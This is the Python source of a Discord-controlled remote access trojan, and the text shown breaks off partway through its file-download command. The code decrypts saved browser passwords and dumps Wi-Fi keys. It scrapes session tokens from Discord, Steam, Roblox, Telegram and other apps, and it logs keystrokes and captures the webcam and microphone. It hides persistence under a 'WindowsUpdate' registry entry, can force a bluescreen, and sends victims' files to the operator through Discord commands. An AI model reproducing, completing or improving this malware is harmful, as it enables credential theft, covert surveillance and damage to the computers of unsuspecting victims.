import os
import discord
from discord.ext import commands
import asyncio
import sys
import subprocess
import time
import pyautogui
import psutil
import pygetwindow as gw
from datetime import datetime
from typing import Optional
import random
import string
import ctypes
import threading
import pyttsx3
import platform
import uuid
import socket
import re
import requests
import winreg
import base64
import atexit
import win32clipboard
import cv2
import shutil
import glob
import json
import sqlite3
import win32crypt
from PIL import ImageGrab
import certifi
import ssl
import tempfile

if getattr(sys, 'frozen', False):
    os.environ['SSL_CERT_FILE'] = certifi.where()
    os.environ['REQUESTS_CA_BUNDLE'] = certifi.where()
    ssl._create_default_https_context = ssl._create_unverified_context

try:
    from Crypto.Cipher import AES
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False
    AES = None

try:
    import pyaudio
    import wave
    AUDIO_AVAILABLE = True
except ImportError:
    AUDIO_AVAILABLE = False
    pyaudio = None
    wave = None

if platform.system() != "Windows":
    sys.exit(0)

dir = os.path.dirname(os.path.abspath(__file__))
lock = os.path.join(dir, ".lock")
if os.path.exists(lock):
    sys.exit(0)
open(lock, "w").close()

running = True
keylog_active = False
keylog_file = os.environ['TEMP'] + "\\syslog.txt"
critical_mode = False
shake_active = False

def cleanup():
    global running
    running = False
    if os.path.exists(lock):
        os.remove(lock)
atexit.register(cleanup)

def keep_lock_alive():
    while running:
        if not os.path.exists(lock):
            open(lock, "w").close()
        time.sleep(0.1)
threading.Thread(target=keep_lock_alive, daemon=True).start()

class Config:
    TOKEN = "{placeholder_token}"
    WHITELISTED = [{placeholder_whitelist}]
    MAIN_CHANNEL = {placeholder_main_channel}
    PREFIX = "{placeholder_prefix}"
    STARTUP = {placeholder_add_to_startup}

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix=Config.PREFIX, intents=intents)
bot.remove_command("help")

current_path = os.environ['SYSTEMDRIVE'] + "\\"

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def add_to_startup():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, sys.executable)
        winreg.CloseKey(key)
        return True
    except:
        return False

def get_displayname():
    try:
        GetUserNameEx = ctypes.windll.secur32.GetUserNameExW
        NameDisplay = 3
        size = ctypes.pointer(ctypes.c_ulong(0))
        GetUserNameEx(NameDisplay, None, size)
        nameBuffer = ctypes.create_unicode_buffer(size.contents.value)
        GetUserNameEx(NameDisplay, nameBuffer, size)
        return nameBuffer.value
    except:
        return platform.node()

def get_hwid():
    try:
        cmd = 'powershell -Command "Get-CimInstance -ClassName Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID"'
        result = subprocess.check_output(cmd, shell=True).decode().strip()
        return result if result else str(uuid.getnode())
    except:
        return str(uuid.getnode())

def get_cpuinfo():
    try:
        cmd = 'powershell -Command "Get-CimInstance -ClassName Win32_Processor | Select-Object -ExpandProperty Name"'
        cpu = subprocess.check_output(cmd, shell=True).decode().strip()
        return cpu if cpu else platform.processor() or "N/A"
    except:
        return platform.processor() or "N/A"

def get_gpuinfo():
    try:
        cmd = 'powershell -Command "Get-CimInstance -ClassName Win32_VideoController | Select-Object -ExpandProperty Name"'
        gpu = subprocess.check_output(cmd, shell=True).decode().strip()
        return gpu.split('\n')[0] if gpu else "N/A"
    except:
        return "N/A"

def get_raminfo():
    ram = psutil.virtual_memory()
    return f"{ram.total / (1024**3):.2f} GB"

def get_disks():
    disks = []
    for partition in psutil.disk_partitions():
        try:
            usage = psutil.disk_usage(partition.mountpoint)
            disks.append({'drive': partition.device, 'free': f"{usage.free / (1024**3):.2f}", 'total': f"{usage.total / (1024**3):.2f}", 'percent': usage.percent})
        except:
            pass
    return disks

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "N/A"

def get_ipinfo():
    try:
        response = requests.get('http://ip-api.com/json/', timeout=5)
        if response.status_code == 200:
            data = response.json()
            return {'ip': data.get('query', 'N/A'), 'country': data.get('country', 'N/A'), 'region': data.get('regionName', 'N/A'), 'city': data.get('city', 'N/A'), 'isp': data.get('isp', 'N/A')}
    except:
        pass
    return {'ip': get_local_ip(), 'country': 'N/A', 'region': 'N/A', 'city': 'N/A', 'isp': 'N/A'}

def get_macaddress():
    try:
        return ':'.join(re.findall('..', '%012x' % uuid.getnode()))
    except:
        return "N/A"

def get_wifipasswords():
    profiles = []
    try:
        networks = subprocess.check_output('netsh wlan show profiles', shell=True).decode('utf-8', errors='ignore')
        profile_names = re.findall(r'All User Profile\s*:\s*(.*)', networks)
        for name in profile_names:
            name = name.strip()
            try:
                info = subprocess.check_output(f'netsh wlan show profile "{name}" key=clear', shell=True).decode('utf-8', errors='ignore')
                password_match = re.search(r'Key Content\s*:\s*(.*)', info)
                profiles.append({'name': name, 'password': password_match.group(1).strip() if password_match else "N/A"})
            except:
                profiles.append({'name': name, 'password': "N/A"})
    except:
        pass
    return profiles

def get_folder_path(folder_name):
    folder_map = {
        'downloads': "{374DE290-123F-4565-9164-39C4925E467B}",
        'documents': "Personal",
        'pictures': "My Pictures",
        'music': "My Music",
        'videos': "My Video",
        'desktop': "Desktop"
    }
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders")
        path = winreg.QueryValueEx(key, folder_map[folder_name])[0]
        winreg.CloseKey(key)
        if os.path.exists(path):
            return path
    except:
        pass
    return os.path.join(os.path.expanduser('~'), folder_name.capitalize())

def get_browser_history(browser_name, history_db_path):
    history = []
    try:
        if not os.path.exists(history_db_path):
            return []
        temp_db = os.path.join(tempfile.gettempdir(), f"{browser_name}_history.db")
        shutil.copy2(history_db_path, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        try:
            cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 50")
        except:
            cursor.execute("SELECT url, title, visit_time FROM visits ORDER BY visit_time DESC LIMIT 50")
        for row in cursor.fetchall():
            if len(row) >= 2:
                url = row[0]
                title = row[1] if row[1] else "No Title"
                history.append(f"📄 {title}\n🔗 {url}\n")
        conn.close()
        os.remove(temp_db)
        return history
    except:
        return []

def get_all_browser_history():
    all_history = []
    detected = []
    browsers = {
        "Chrome": os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data\Default\History",
        "Edge": os.path.expanduser("~") + r"\AppData\Local\Microsoft\Edge\User Data\Default\History",
        "Brave": os.path.expanduser("~") + r"\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History",
        "Opera": os.path.expanduser("~") + r"\AppData\Roaming\Opera Software\Opera Stable\History",
        "Vivaldi": os.path.expanduser("~") + r"\AppData\Local\Vivaldi\User Data\Default\History"
    }
    for name, path in browsers.items():
        if os.path.exists(path):
            detected.append(name)
            history = get_browser_history(name, path)
            if history:
                all_history.append(f"**{name} History:**")
                all_history.extend(history[:20])
                all_history.append("-" * 40)
    return all_history, detected

def get_browser_passwords(browser_name, user_data_path):
    passwords = []
    try:
        if not CRYPTO_AVAILABLE:
            return ["pycryptodome not installed"]
        local_state_path = os.path.join(user_data_path, "Local State")
        if not os.path.exists(local_state_path):
            return []
        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        profiles = ["Default"] + [f"Profile {i}" for i in range(1, 10)]
        for profile in profiles:
            login_db = os.path.join(user_data_path, profile, "Login Data")
            if not os.path.exists(login_db):
                continue
            temp_db = os.environ['TEMP'] + f"\\{browser_name}_login.db"
            shutil.copy2(login_db, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            for url, username, encrypted_pass in cursor.fetchall():
                if encrypted_pass:
                    try:
                        iv = encrypted_pass[3:15]
                        payload = encrypted_pass[15:]
                        cipher = AES.new(master_key, AES.MODE_GCM, iv)
                        decrypted = cipher.decrypt(payload)[:-16].decode()
                        passwords.append(f"{browser_name} - {url}\nUser: {username}\nPass: {decrypted}\n{'-'*40}")
                    except:
                        pass
            conn.close()
            os.remove(temp_db)
        return passwords
    except:
        return []

def get_all_browser_passwords():
    all_passwords = []
    detected = []
    browsers = {
        "Chrome": os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data",
        "Edge": os.path.expanduser("~") + r"\AppData\Local\Microsoft\Edge\User Data",
        "Brave": os.path.expanduser("~") + r"\AppData\Local\BraveSoftware\Brave-Browser\User Data",
        "Opera": os.path.expanduser("~") + r"\AppData\Roaming\Opera Software\Opera Stable",
        "Vivaldi": os.path.expanduser("~") + r"\AppData\Local\Vivaldi\User Data"
    }
    for name, path in browsers.items():
        if os.path.exists(path):
            detected.append(name)
            passwords = get_browser_passwords(name, path)
            all_passwords.extend(passwords)
    return all_passwords, detected

def grab_all_tokens():
    tokens = []
    detected_apps = []
    discord_paths = [
        os.path.expanduser("~") + r"\AppData\Roaming\Discord\Local Storage\leveldb",
        os.path.expanduser("~") + r"\AppData\Roaming\DiscordPTB\Local Storage\leveldb",
        os.path.expanduser("~") + r"\AppData\Roaming\DiscordCanary\Local Storage\leveldb",
        os.path.expanduser("~") + r"\AppData\Roaming\Lightcord\Local Storage\leveldb",
    ]
    for path in discord_paths:
        if os.path.exists(path):
            detected_apps.append("Discord")
            try:
                for file in os.listdir(path):
                    if file.endswith((".log", ".ldb")):
                        with open(os.path.join(path, file), 'r', errors='ignore') as f:
                            data = f.read()
                            matches = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', data)
                            for match in matches:
                                tokens.append(f"🟣 Discord Token: {match}")
                            matches = re.findall(r'mfa\.[\w-]{84}', data)
                            for match in matches:
                                tokens.append(f"🟣 Discord MFA: {match}")
            except:
                pass
    chrome_path = os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data\Default"
    if os.path.exists(chrome_path):
        detected_apps.append("Chrome")
        try:
            cookies_db = os.path.join(chrome_path, "Cookies")
            if os.path.exists(cookies_db):
                temp_db = os.environ['TEMP'] + "\\cookies.db"
                shutil.copy2(cookies_db, temp_db)
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT host_key, name, value FROM cookies WHERE name LIKE '%token%' OR name LIKE '%auth%' OR name LIKE '%session%' OR name LIKE '%refresh%'")
                for host, name, value in cursor.fetchall():
                    if value and len(str(value)) > 10:
                        tokens.append(f"🍪 Cookie: {host} - {name} ({str(value)[:30]}...)")
                conn.close()
                os.remove(temp_db)
        except:
            pass
    steam_path = os.path.expanduser("~") + r"\AppData\Local\Steam\config\loginusers.vdf"
    if os.path.exists(steam_path):
        detected_apps.append("Steam")
        try:
            with open(steam_path, 'r', errors='ignore') as f:
                data = f.read()
                matches = re.findall(r'"AccountName"\s*"([^"]+)"', data)
                for match in matches:
                    tokens.append(f"🎮 Steam Account: {match}")
                matches = re.findall(r'"SteamID"\s*"([^"]+)"', data)
                for match in matches:
                    tokens.append(f"🎮 Steam ID: {match}")
        except:
            pass
    epic_path = os.path.expanduser("~") + r"\AppData\Local\Epic Games\Launcher\Saved\Config\Windows\GameUserSettings.ini"
    if os.path.exists(epic_path):
        detected_apps.append("Epic Games")
        try:
            with open(epic_path, 'r', errors='ignore') as f:
                data = f.read()
                matches = re.findall(r'[a-f0-9]{32}', data)
                for match in matches:
                    tokens.append(f"🎯 Epic Games: {match}")
        except:
            pass
    mc_paths = [
        os.path.expanduser("~") + r"\AppData\Roaming\.minecraft\launcher_profiles.json",
        os.path.expanduser("~") + r"\AppData\Roaming\.minecraft\usercache.json"
    ]
    for path in mc_paths:
        if os.path.exists(path):
            detected_apps.append("Minecraft")
            try:
                with open(path, 'r', errors='ignore') as f:
                    data = f.read()
                    matches = re.findall(r'"accessToken":"([^"]+)"', data)
                    for match in matches:
                        tokens.append(f"⛏️ Minecraft: {match[:20]}...")
                    matches = re.findall(r'"uuid":"([^"]+)"', data)
                    for match in matches:
                        tokens.append(f"⛏️ Minecraft UUID: {match}")
            except:
                pass
    spotify_path = os.path.expanduser("~") + r"\AppData\Roaming\Spotify\Users"
    if os.path.exists(spotify_path):
        detected_apps.append("Spotify")
        try:
            for file in os.listdir(spotify_path):
                if file.endswith(".json"):
                    with open(os.path.join(spotify_path, file), 'r', errors='ignore') as f:
                        data = f.read()
                        matches = re.findall(r'"accessToken":"([^"]+)"', data)
                        for match in matches:
                            tokens.append(f"🎵 Spotify: {match[:30]}...")
        except:
            pass
    riot_path = os.path.expanduser("~") + r"\AppData\Local\Riot Games\Riot Client\Data"
    if os.path.exists(riot_path):
        detected_apps.append("Riot Games")
        try:
            for root, dirs, files in os.walk(riot_path):
                for file in files:
                    if file.endswith(".json"):
                        with open(os.path.join(root, file), 'r', errors='ignore') as f:
                            data = f.read()
                            matches = re.findall(r'"[a-zA-Z0-9_-]{30,}"', data)
                            for match in matches:
                                if len(match) > 30:
                                    tokens.append(f"🏹 Riot Games: {match[:30]}...")
        except:
            pass
    roblox_path = os.path.expanduser("~") + r"\AppData\Local\Roblox\Local Storage\leveldb"
    if os.path.exists(roblox_path):
        detected_apps.append("Roblox")
        try:
            for file in os.listdir(roblox_path):
                if file.endswith((".log", ".ldb")):
                    with open(os.path.join(roblox_path, file), 'r', errors='ignore') as f:
                        data = f.read()
                        matches = re.findall(r'"_|ROBLOSECURITY":"([^"]+)"', data)
                        for match in matches:
                            tokens.append(f"🧱 Roblox: {match[:30]}...")
        except:
            pass
    reddit_path = os.path.expanduser("~") + r"\AppData\Roaming\Reddit\Local Storage\leveldb"
    if os.path.exists(reddit_path):
        detected_apps.append("Reddit")
        try:
            for file in os.listdir(reddit_path):
                if file.endswith((".log", ".ldb")):
                    with open(os.path.join(reddit_path, file), 'r', errors='ignore') as f:
                        data = f.read()
                        matches = re.findall(r'"access_token":"([^"]+)"', data)
                        for match in matches:
                            tokens.append(f"🔴 Reddit: {match[:30]}...")
        except:
            pass
    tiktok_path = os.path.expanduser("~") + r"\AppData\Roaming\TikTok\Local Storage\leveldb"
    if os.path.exists(tiktok_path):
        detected_apps.append("TikTok")
        try:
            for file in os.listdir(tiktok_path):
                if file.endswith((".log", ".ldb")):
                    with open(os.path.join(tiktok_path, file), 'r', errors='ignore') as f:
                        data = f.read()
                        matches = re.findall(r'"sessionid":"([^"]+)"', data)
                        for match in matches:
                            tokens.append(f"🎵 TikTok: {match[:30]}...")
        except:
            pass
    battlenet_path = os.path.expanduser("~") + r"\AppData\Local\Battle.net\Blizzard\Local Storage\leveldb"
    if os.path.exists(battlenet_path):
        detected_apps.append("Battle.net")
        try:
            for file in os.listdir(battlenet_path):
                if file.endswith((".log", ".ldb")):
                    with open(os.path.join(battlenet_path, file), 'r', errors='ignore') as f:
                        data = f.read()
                        matches = re.findall(r'"access_token":"([^"]+)"', data)
                        for match in matches:
                            tokens.append(f"🎮 Battle.net: {match[:30]}...")
        except:
            pass
    telegram_paths = [
        os.path.expanduser("~") + r"\AppData\Roaming\Telegram Desktop\tdata",
        os.path.expanduser("~") + r"\AppData\Roaming\Telegram Desktop\tdummy"
    ]
    for path in telegram_paths:
        if os.path.exists(path):
            detected_apps.append("Telegram")
            try:
                for file in os.listdir(path):
                    if file.endswith(".s"):
                        with open(os.path.join(path, file), 'rb') as f:
                            data = f.read()
                            matches = re.findall(rb'\d+:[a-zA-Z0-9_-]{35}', data)
                            for match in matches:
                                tokens.append(f"🔵 Telegram: {match.decode('utf-8', errors='ignore')}")
            except:
                pass
    wa_path = os.path.expanduser("~") + r"\AppData\Roaming\WhatsApp\Local Storage\leveldb"
    if os.path.exists(wa_path):
        detected_apps.append("WhatsApp")
        try:
            for file in os.listdir(wa_path):
                if file.endswith((".log", ".ldb")):
                    with open(os.path.join(wa_path, file), 'r', errors='ignore') as f:
                        data = f.read()
                        matches = re.findall(r'"token":"([^"]+)"', data)
                        for match in matches:
                            tokens.append(f"💬 WhatsApp: {match[:30]}...")
        except:
            pass
    return tokens, list(set(detected_apps))

def get_idle_time():
    class LASTINPUTINFO(ctypes.Structure):
        _fields_ = [("cbSize", ctypes.c_uint), ("dwTime", ctypes.c_uint)]
    lastInputInfo = LASTINPUTINFO()
    lastInputInfo.cbSize = ctypes.sizeof(LASTINPUTINFO)
    ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lastInputInfo))
    millis = ctypes.windll.kernel32.GetTickCount() - lastInputInfo.dwTime
    seconds = millis // 1000
    return f"{seconds//3600}h {(seconds%3600)//60}m {seconds%60}s"

def capture_webcam(cam_id=0):
    cap = cv2.VideoCapture(cam_id)
    if not cap.isOpened():
        return None
    ret, frame = cap.read()
    if ret:
        path = os.environ['TEMP'] + "\\webcam.jpg"
        cv2.imwrite(path, frame)
        cap.release()
        return path
    cap.release()
    return None

def record_mic(duration=10):
    if not AUDIO_AVAILABLE:
        return None
    CHUNK = 1024
    FORMAT = pyaudio.paInt16
    CHANNELS = 1
    RATE = 44100
    p = pyaudio.PyAudio()
    stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
    frames = [stream.read(CHUNK) for _ in range(0, int(RATE / CHUNK * duration))]
    stream.stop_stream()
    stream.close()
    p.terminate()
    path = os.environ['TEMP'] + "\\mic.wav"
    wf = wave.open(path, 'wb')
    wf.setnchannels(CHANNELS)
    wf.setsampwidth(p.get_sample_size(FORMAT))
    wf.setframerate(RATE)
    wf.writeframes(b''.join(frames))
    wf.close()
    return path

def speak(text):
    engine = pyttsx3.init()
    engine.say(text)
    engine.runAndWait()

def show_message_box(text):
    ctypes.windll.user32.MessageBoxW(0, text, "System Message", 0)

def set_wallpaper(image_path):
    ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 0)

def block_input(block):
    ctypes.windll.user32.BlockInput(block)

def make_critical():
    global critical_mode
    try:
        ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0)
        critical_mode = True
        return True
    except:
        return False

def bluescreen():
    if not is_admin():
        return False
    ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
    ctypes.windll.ntdll.NtRaiseHardError(0xC0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
    return True

def hide_process():
    if is_admin():
        ctypes.windll.kernel32.SetConsoleTitleW("svchost.exe")
        return True
    return False

def start_keylog():
    global keylog_active
    keylog_active = True
    from pynput import keyboard
    def on_press(key):
        if not keylog_active:
            return False
        with open(keylog_file, 'a', encoding='utf-8') as f:
            try:
                if hasattr(key, 'char') and key.char:
                    f.write(key.char)
                elif key == key.space:
                    f.write(' ')
                elif key == key.enter:
                    f.write('\n')
                else:
                    f.write(f'[{str(key).replace("Key.", "").upper()}]')
            except:
                pass
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    listener.join()

def start_shake(duration_seconds=10):
    global shake_active
    if shake_active:
        return False
    shake_active = True
    def shake_loop():
        global shake_active
        start_time = time.time()
        while shake_active and (time.time() - start_time) < duration_seconds:
            x, y = pyautogui.position()
            for dx, dy in [(0, 10), (10, 0), (0, -10), (-10, 0)]:
                if not shake_active:
                    break
                pyautogui.moveTo(x + dx, y + dy, duration=0.01)
                time.sleep(0.01)
            time.sleep(0.02)
        shake_active = False
    thread = threading.Thread(target=shake_loop, daemon=True)
    thread.start()
    return True

def stop_shake():
    global shake_active
    shake_active = False
    return True

def get_recent_downloads():
    downloads = []
    try:
        downloads_path = get_folder_path('downloads')
        if os.path.exists(downloads_path):
            files = os.listdir(downloads_path)
            for f in sorted(files, key=lambda x: os.path.getmtime(os.path.join(downloads_path, x)), reverse=True)[:30]:
                path = os.path.join(downloads_path, f)
                if os.path.isfile(path):
                    size = os.path.getsize(path)
                    size_str = f"{size/1024:.1f} KB" if size < 1048576 else f"{size/1048576:.1f} MB"
                    mtime = datetime.fromtimestamp(os.path.getmtime(path)).strftime('%Y-%m-%d %H:%M')
                    downloads.append(f"📄 {f}\n   Size: {size_str} | Modified: {mtime}\n")
        return downloads if downloads else ["No recent downloads found"]
    except:
        return ["Error getting downloads"]

def get_installed_programs():
    programs = []
    try:
        key_paths = [
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
            r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
        ]
        for key_path in key_paths:
            try:
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path)
                for i in range(0, winreg.QueryInfoKey(key)[0]):
                    try:
                        subkey_name = winreg.EnumKey(key, i)
                        subkey = winreg.OpenKey(key, subkey_name)
                        try:
                            name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                            if name:
                                try:
                                    version = winreg.QueryValueEx(subkey, "DisplayVersion")[0]
                                    programs.append(f"{name} (v{version})")
                                except:
                                    programs.append(name)
                        except:
                            pass
                        winreg.CloseKey(subkey)
                    except:
                        pass
                winreg.CloseKey(key)
            except:
                pass
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall")
            for i in range(0, winreg.QueryInfoKey(key)[0]):
                try:
                    subkey_name = winreg.EnumKey(key, i)
                    subkey = winreg.OpenKey(key, subkey_name)
                    try:
                        name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                        if name:
                            programs.append(f"👤 {name}")
                    except:
                        pass
                    winreg.CloseKey(subkey)
                except:
                    pass
            winreg.CloseKey(key)
        except:
            pass
        return list(set(programs)) if programs else ["No programs found"]
    except:
        return ["Error getting installed programs"]

def get_file_emoji(filename):
    ext = os.path.splitext(filename)[1].lower()
    emoji_map = {
        '.txt': '📄', '.py': '🐍', '.pyw': '🐍', '.exe': '⚙️', '.dll': '🔧',
        '.jpg': '🖼️', '.jpeg': '🖼️', '.png': '🖼️', '.gif': '🖼️', '.bmp': '🖼️', '.webp': '🖼️', '.ico': '🖼️', '.svg': '🖼️',
        '.mp3': '🎵', '.wav': '🎵', '.flac': '🎵', '.aac': '🎵', '.ogg': '🎵', '.wma': '🎵',
        '.mp4': '🎬', '.avi': '🎬', '.mkv': '🎬', '.mov': '🎬', '.wmv': '🎬', '.flv': '🎬', '.webm': '🎬', '.m4v': '🎬',
        '.zip': '📦', '.rar': '📦', '.7z': '📦', '.tar': '📦', '.gz': '📦',
        '.pdf': '📕', '.doc': '📘', '.docx': '📘', '.xls': '📊', '.xlsx': '📊',
        '.lua': '📜', '.json': '📋', '.xml': '📋', '.html': '🌐', '.css': '🎨', '.js': '⚡',
        '.iso': '💿', '.msi': '📦', '.bat': '💻', '.cmd': '💻', '.ps1': '💻',
        '.reg': '📝', '.ini': '📝', '.cfg': '📝', '.conf': '📝', '.log': '📋',
        '.ttf': '🔤', '.otf': '🔤', '.woff': '🔤',
        '.apk': '📱', '.ipa': '📱', '.torrent': '🧲'
    }
    return emoji_map.get(ext, '📄')

def is_authorized():
    async def auth(ctx):
        if ctx.author.id in Config.WHITELISTED:
            return True
        embed = discord.Embed(title="Access Denied", color=discord.Color.red())
        await ctx.send(embed=embed)
        return False
    return commands.check(auth)

async def send_embed(ctx, title, description, color=discord.Color.blue()):
    embed = discord.Embed(title=title, description=description, color=color)
    await ctx.send(embed=embed)

@bot.event
async def on_ready():
    await bot.get_channel(Config.MAIN_CHANNEL).send(f"<@{Config.WHITELISTED[0]}>")
    embed = discord.Embed(title="RAT Online", description=f"Prefix: `{Config.PREFIX}`\nUser: `{get_displayname()}`\nAdmin: {is_admin()}", color=discord.Color.green())
    await bot.get_channel(Config.MAIN_CHANNEL).send(embed=embed)

# ========== EXISTING COMMANDS (unchanged for brevity) ==========
# ... (all your existing commands remain the same - info, lock, crash, etc.)

# ========== FIXED IMAGES ONLY ==========
@bot.command(name='images')
@is_authorized()
async def list_images(ctx, directory: str = "."):
    """List only image files (jpg, png, gif, webp, bmp, ico, svg, tiff)"""
    try:
        if directory.startswith("~"):
            directory = os.path.expanduser(directory)
        if directory == ".":
            directory = current_path
        if not os.path.exists(directory):
            await send_embed(ctx, "Error", f"Directory not found: {directory}", discord.Color.red())
            return
        if not os.path.isdir(directory):
            await send_embed(ctx, "Error", f"Not a directory: {directory}", discord.Color.red())
            return
        
        image_exts = {'.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp', '.tiff', '.ico', '.svg'}
        files = os.listdir(directory)
        images = []
        
        for f in files:
            path = os.path.join(directory, f)
            if os.path.isfile(path):
                ext = os.path.splitext(f)[1].lower()
                if ext in image_exts:
                    size = os.path.getsize(path)
                    if size < 1024:
                        size_str = f"{size} B"
                    elif size < 1048576:
                        size_str = f"{size/1024:.1f} KB"
                    else:
                        size_str = f"{size/1048576:.1f} MB"
                    images.append(f"🖼️ {f} ({size_str})")
        
        if not images:
            await send_embed(ctx, f"📁 {directory}", "No images found", discord.Color.orange())
            return
        
        output = "\n".join(images[:50])
        if len(output) > 1900:
            output = output[:1900] + "..."
        await send_embed(ctx, f"🖼️ Images in {directory}", output, discord.Color.blue())
    except Exception as e:
        await send_embed(ctx, "Error", str(e), discord.Color.red())

# ========== VIDS ONLY ==========
@bot.command(name='vids')
@is_authorized()
async def list_videos_only(ctx, directory: str = "."):
    """List only video files (mp4, avi, mkv, mov, wmv, flv, webm, m4v)"""
    try:
        if directory.startswith("~"):
            directory = os.path.expanduser(directory)
        if directory == ".":
            directory = current_path
        if not os.path.exists(directory):
            await send_embed(ctx, "Error", f"Directory not found: {directory}", discord.Color.red())
            return
        if not os.path.isdir(directory):
            await send_embed(ctx, "Error", f"Not a directory: {directory}", discord.Color.red())
            return
        
        video_exts = {'.mp4', '.avi', '.mkv', '.mov', '.wmv', '.flv', '.webm', '.m4v', '.mpg', '.mpeg', '.3gp'}
        files = os.listdir(directory)
        videos = []
        
        for f in files:
            path = os.path.join(directory, f)
            if os.path.isfile(path):
                ext = os.path.splitext(f)[1].lower()
                if ext in video_exts:
                    size = os.path.getsize(path)
                    if size < 1048576:
                        size_str = f"{size/1024:.1f} KB"
                    else:
                        size_str = f"{size/1048576:.1f} MB"
                    videos.append(f"🎬 {f} ({size_str})")
        
        if not videos:
            await send_embed(ctx, f"📁 {directory}", "No videos found", discord.Color.orange())
            return
        
        output = "\n".join(videos[:50])
        if len(output) > 1900:
            output = output[:1900] + "..."
        await send_embed(ctx, f"🎬 Videos in {directory}", output, discord.Color.blue())
    except Exception as e:
        await send_embed(ctx, "Error", str(e), discord.Color.red())

# ========== AUDIO ONLY ==========
@bot.command(name='audio')
@is_authorized()
async def list_audio_only(ctx, directory: str = "."):
    """List only audio files (mp3, wav, flac, aac, ogg, wma, m4a, opus)"""
    try:
        if directory.startswith("~"):
            directory = os.path.expanduser(directory)
        if directory == ".":
            directory = current_path
        if not os.path.exists(directory):
            await send_embed(ctx, "Error", f"Directory not found: {directory}", discord.Color.red())
            return
        if not os.path.isdir(directory):
            await send_embed(ctx, "Error", f"Not a directory: {directory}", discord.Color.red())
            return
        
        audio_exts = {'.mp3', '.wav', '.flac', '.aac', '.ogg', '.wma', '.m4a', '.opus'}
        files = os.listdir(directory)
        audio = []
        
        for f in files:
            path = os.path.join(directory, f)
            if os.path.isfile(path):
                ext = os.path.splitext(f)[1].lower()
                if ext in audio_exts:
                    size = os.path.getsize(path)
                    if size < 1048576:
                        size_str = f"{size/1024:.1f} KB"
                    else:
                        size_str = f"{size/1048576:.1f} MB"
                    audio.append(f"🎵 {f} ({size_str})")
        
        if not audio:
            await send_embed(ctx, f"📁 {directory}", "No audio files found", discord.Color.orange())
            return
        
        output = "\n".join(audio[:50])
        if len(output) > 1900:
            output = output[:1900] + "..."
        await send_embed(ctx, f"🎵 Audio in {directory}", output, discord.Color.blue())
    except Exception as e:
        await send_embed(ctx, "Error", str(e), discord.Color.red())

# ========== FIXED PICTURES COMMAND ==========
@bot.command(name='pictures')
@is_authorized()
async def pictures_cmd(ctx, *, path: str = ""):
    """Show only images in Pictures folder"""
    base = get_folder_path('pictures')
    if path:
        target = os.path.join(base, path)
        if os.path.exists(target) and os.path.isdir(target):
            await list_images(ctx, target)
        else:
            await send_embed(ctx, "Error", f"Folder not found: {target}", discord.Color.red())
    else:
        await list_images(ctx, base)

@bot.command(name='pics')
@is_authorized()
async def pics_cmd(ctx):
    """Show only images in Pictures folder"""
    await pictures_cmd(ctx)

@bot.command(name='camroll')
@is_authorized()
async def camroll_cmd(ctx):
    """Show images from Camera Roll"""
    path = os.path.join(get_folder_path('pictures'), 'Camera Roll')
    if os.path.exists(path) and os.path.isdir(path):
        await list_images(ctx, path)
    else:
        await send_embed(ctx, "Error", "Camera Roll folder not found", discord.Color.red())

# ========== FIXED DOWNLOAD COMMAND (HANDLES LARGE FILES) ==========
@bot.command(name='download')
@is_authorized()
async def download_file(ctx, *, filepath: str):
    """Download a file - auto-splits large files (25MB+)"""
    try:
        if not os.path.isabs(filepath) and not filepath.startswith('.'):
            filepath = os.path.join(current_path, filepath)
        elif filepath.startswith('.'):
            filepath = os.path.join(current_path, filepath[2:])
        filepath = os.path.normpath(filepath)
        
        if os.path.exists(filepath) and os.path.isfile(filepath):
            size = os.path.getsize(filepath)
            
            if size > 104857600:  # 100MB
                await send_embed(ctx, "Error", "File >100MB. Use external upload.", discord.Color.red())
                return
                
            elif size > 25000000:  # 25MB Discord limit
                await send_embed(ctx, "⚠️ Large File", f"Size: {size/1048576:.1f}MB. Splitting into chunks...", discord.Color.orange())
